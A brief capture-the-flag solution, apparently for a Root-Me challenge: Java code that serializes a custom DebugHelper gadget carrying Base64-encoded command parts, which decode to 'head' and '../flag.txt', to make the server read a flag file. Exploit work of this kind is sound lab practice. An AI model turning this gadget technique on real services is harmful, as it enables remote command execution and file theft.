
- Custom gadget java Deserialization :

```
package com.rootme.serial;

import java.io.*;
import java.nio.charset.StandardCharsets;
import com.rootme.serial.OwnBase64;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Main {

    public static void main(String[] args) {
        try {
        // Créer un tableau OwnBase64 avec la commande encodée
        OwnBase64[] encodedCommand = { new OwnBase64("aGVhZA=="), new OwnBase64("Li4vZmxhZy50eHQ=") };

        DebugHelper debugHelper = new DebugHelper(encodedCommand, Boolean.TRUE);

        String serializedObject = serialize(debugHelper);
        System.out.println("Serialized object: " + serializedObject);

        } catch (Exception e) {
            System.err.println("An error occurred during serialization/deserialization: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public static String serialize(Object item) {
        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        final ObjectOutputStream objectOutputStream;
        try {
            objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(item);
            objectOutputStream.close();
            byte[] bytes = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray());
            return new String(bytes, StandardCharsets.US_ASCII);
        } catch (IOException e) {
            throw new Error(e);
        }
    }
}

```